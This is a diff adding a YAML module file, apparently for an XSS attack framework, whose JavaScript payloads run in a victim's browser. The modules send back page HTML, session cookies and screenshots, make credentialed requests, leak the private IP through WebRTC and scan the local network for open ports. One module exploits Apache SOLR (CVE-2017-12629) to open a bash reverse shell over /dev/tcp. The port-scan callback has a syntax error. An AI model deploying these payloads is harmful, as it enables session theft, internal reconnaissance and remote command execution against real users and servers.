@@ -1,0 +1,214 @@
+- name: Get HTML
+  description: Gets the HTML of the page.
+  code: |
+    function getInnerHtml(send) {
+      send(document.documentElement.outerHTML)
+    }
+
+  callback: |
+    function callback(log, data) {
+      const b = new Blob([data], { type: 'text/plain' });
+      const url = URL.createObjectURL(b);
+      log(`The HTML code is back! <a target=_blank href=${url}>Click here</a> to read it.`, 'html');
+    }
+
+- name: Basic info
+  description: Gets some basic information about the victim and its browser, e.g. URL address of current page, cookies etc.
+  code: |
+    function getCookies(send) {
+      send({
+        url: location.href,
+        cookie: document.cookie,
+        ua: navigator.userAgent,
+
+      });
+    }
+
+  callback: |
+    function callback(log, data) {
+      log('Cookies: ' + data.cookie);
+      log('User-Agent: ' + data.ua);
+      log('Current URL: ' + data.url);
+    }
+
+- name: Screenshot
+  description: Takes a screenshot of the page using html2canvas library.
+  code: |
+    function takeScreenshot(send) {
+            var s = document.createElement('script');
+            s.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
+            s.onload = async () => {
+                const canvas = await html2canvas(document.body);
+                send(canvas.toDataURL('image/jpeg', 0.2));
+            };
+            document.head.appendChild(s);
+    }
+
+  callback: |
+    function callback(log, data) {
+      log(`Screenshot is back! <a target=_blank href=${data}>Click here to see it.</a>`, 'html');
+    }
+
+- name: request
+  description: A simple module showing that you can perform any request!
+  code: |
+    async function performRequest(send) {
+      // Change the URL if you wish.
+      const URL = '/';
+      const method = 'GET';
+
+      const f = await fetch(URL, { credentials: 'include' });
+      send(await f.text());
+
+    }
+
+  callback: |
+      function callback(log, data) {
+        const b = new Blob([data], { type: 'text/plain' });
+        const url = URL.createObjectURL(b);
+        log(`The request has been sent! <a target=_blank href=${url}>Click here</a> to read the response.`, 'html');
+      }
+
+- name: IP addr
+  description: Gets local IP by abusing WebRTC.
+  code: |
+    function getInternalIP(send) {
+      // based on https://stackoverflow.com/a/32838936
+      var pc = new RTCPeerConnection({iceServers:[]});
+      pc.createDataChannel("");
+      pc.createOffer(pc.setLocalDescription.bind(pc), function(){});
+      pc.onicecandidate = function(ice) {
+        if(!ice || !ice.candidate || !ice.candidate.candidate)  return;
+        const ip = ice.candidate.candidate.split(' ')[4];
+        send(ip);
+      };
+
+    }
+  callback: |
+    function callback(log, data) {
+      log("The user's private IP is: " + data);
+    }
+
+- name: Port scan
+  description: Scans a given network range for given port numbers.
+  code: |
+    function scanPorts(send) {
+      const TIMEOUT = 50;
+
+      const NETWORK = '192.168.0.0';
+      const PORTS = [80, 8080];
+
+      PORTS.forEach(port => checkPortOpen(NETWORK, port));
+
+      function checkPortOpen(host, port) {
+        const a = document.createElement('a');
+        a.href = 'http://0/';
+        a.host = host;
+        a.port = port;
+        const href = a.href;
+
+        const img = new Image();
+        img.onerror = img.onload = () => {
+          send({
+            host,
+            port
+          });
+        };
+
+        setTimeout(() => {
+          img.onerror = img.onload = null;
+          img.src = '';
+        }, TIMEOUT);
+
+        img.src = href;
+      }
+
+      function* generateHostsFromRange(range) {
+        function ipFromInt(int) {
+          let a,b,c,d;
+          a = ((int & 0xFF000000) >> 24) & 0xFF;
+          b = (int & 0x00FF0000) >> 16;
+          c = (int & 0x0000FF00) >> 8;
+          d = (int & 0x000000FF) >> 0;
+
+          return `${a}.${b}.${c}.${d}`;
+        }
+
+        if (range.includes('/')) {
+          const [net, mask] = range.split('/');
+          const [a, b, c, d] = net.split('.');
+          let ipNum = a << 24 | b << 16 | c << 8 | d;
+          const lowerMask = parseInt('1'.repeat(mask) + '0'.repeat(32-mask), 2);
+          const upperMask = parseInt('0'.repeat(mask) + '1'.repeat(32-mask), 2);
+          const lowerIpNum = ipNum & lowerMask;
+          const upperIpNum = lowerIpNum | upperMask;
+
+          for (let i = lowerIpNum; i <= upperIpNum; i++) {
+            yield ipFromInt(i);
+          }
+
+        }
+      }
+
+    }
+  callback: function callback(log, data) { log(data + ' is open';  }
+
+- name: SOLR exploit
+  description: This module exploits a well-known flaw in Apache SOLR (CVE-2017-12629) to achieve a command execution.
+  code: |
+    async function solrExploit(send) {
+      // based on https://cxsecurity.com/issue/WLB-2017100144
+
+      // Set the two values below:
+      const SOLR_URL = 'http://127.0.0.1:8983';
+      const REVERSE_SHELL = ['127.0.0.1', 12345];
+      //
+
+      const collection = randomId('coll');
+      const listener = randomId('listener');
+
+      // Create a new collection
+      send('First request is being sent...');
+      await request(`/solr/admin/collections?action=CREATE&name=${collection}&numShards=1`);
+      send('First request sent!');
+
+      // Add RunExecutableListener
+      const addListener = {
+          "add-listener": {
+              "event": "postCommit",
+              "name": listener,
+              "class": "solr.RunExecutableListener",
+              "exe": "sh",
+              "dir": "/bin/",
+              "args": ["-c", `bash -i >& /dev/tcp/${REVERSE_SHELL.join('/')} 0>&1`]
+          }
+      }
+
+      send('Second request is being sent...');
+      await request(`/solr/${collection}/select?q=x&qt=/solr/${collection}/config?stream.body=${escape(escape(JSON.stringify(addListener)))}&shards=localhost:8983/`);
+      send('Second request sent!');
+
+      // Execute the shell
+      send('Third request is being sent... you should get your shell in a short while!');
+      await request(`/solr/${collection}/update?stream.body=[{"id":"AAA"}]&commit=true&overwrite=true`);
+
+
+      async function request(endpoint) {
+          const url = SOLR_URL + endpoint;
+
+          try {
+              await fetch(url);
+          } catch (ex) {}
+
+      }
+
+      function randomId(prefix) {
+          return prefix + Math.random().toString().slice(2);
+      }
+
+    }
+
+  callback: |
+    function callback(log, data) {
+      log('Solr exploit status: ' + data);
+    }
